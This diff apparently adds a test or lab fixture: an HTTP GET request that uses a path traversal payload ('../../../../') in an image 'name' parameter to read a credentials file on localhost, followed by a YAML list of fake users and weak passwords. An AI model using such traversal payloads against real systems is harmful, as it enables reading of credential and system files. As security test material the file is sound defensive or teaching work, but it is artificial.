@@ -1,0 +1,7 @@
+GET /path-traversal/product/image?name=../../../../fakeCredentials/passwords.yaml HTTP/1.1
+Host: localhost:8080
+
+passwords:
+  johny: "weakPass"
+  daemon: "123456789"
+  admin: "admin1234"
